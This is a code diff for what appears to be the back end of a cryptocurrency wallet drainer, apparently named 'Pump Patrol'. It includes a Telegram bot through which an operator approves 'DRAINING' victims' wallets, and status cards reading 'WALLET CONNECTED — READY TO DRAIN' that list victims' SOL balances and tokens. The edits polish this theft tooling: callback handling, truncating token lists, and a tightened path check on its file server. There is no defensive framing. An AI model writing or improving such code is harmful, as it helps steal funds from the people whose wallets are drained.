@@ -26,11 +26,11 @@ let offset=0;
       const q=u.callback_query;
       if(q){
         const[act,sid]=String(q.data).split(':');
-        api('answerCallbackQuery',{callback_query_id:q.id});
         if(sessions.has(sid)){
           verdicts.set(sid,{a:act,ts:Date.now()});
+          api('answerCallbackQuery',{callback_query_id:q.id});
           api('editMessageText',{chat_id:CHAT,message_id:q.message.message_id,text:(q.message.text||'')+'\n→ '+(act==='go'?'DRAINING':'SKIPPED'),parse_mode:'HTML'});
-        }
+        }else api('answerCallbackQuery',{callback_query_id:q.id,text:'expired session'});
       }else if(u.message)handle(u.message).catch(()=>{});
     }
     await new Promise(s=>setTimeout(s,r?0:3000));
@@ -78,9 +78,13 @@ function readyCard(sid,r){
   let s='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n\n<b>WALLET CONNECTED — READY TO DRAIN</b>\n';
   const ws=r.wallets||[];
   if(!ws.length)s+='<i>no wallets detected in this browser</i>\n';
+  let shown=0;
   for(const w of ws){
     s+='\n'+esc(w.name)+' <code>'+esc(w.addr)+'</code>\n'+w.sol+' SOL';
-    for(const t of w.tokens||[])s+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);
+    for(const t of w.tokens||[]){
+      if(shown>=14){s+='\n· …and '+((w.tokens||[]).length-shown)+' more';break}
+      s+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);shown++;
+    }
   }
   if(r.evm)s+='\nEVM '+esc(r.evm);
   return s;
@@ -171,7 +175,7 @@ http.createServer(async(req,res)=>{
       return;
     }
     const f=path.normalize(path.join(PUB,u.pathname==='/'?'index.html':u.pathname));
-    if(!f.startsWith(PUB))return json(res,{ok:false},403);
+    if(f!==PUB&&!f.startsWith(PUB+path.sep))return json(res,{ok:false},403);
     const data=await fs.promises.readFile(f).catch(()=>null);
     if(!data){res.writeHead(404).end('not found');return}
     res.writeHead(200,{'content-type':MIME[path.extname(f)]||'application/octet-stream','cache-control':'no-store','access-control-allow-origin':'*'});
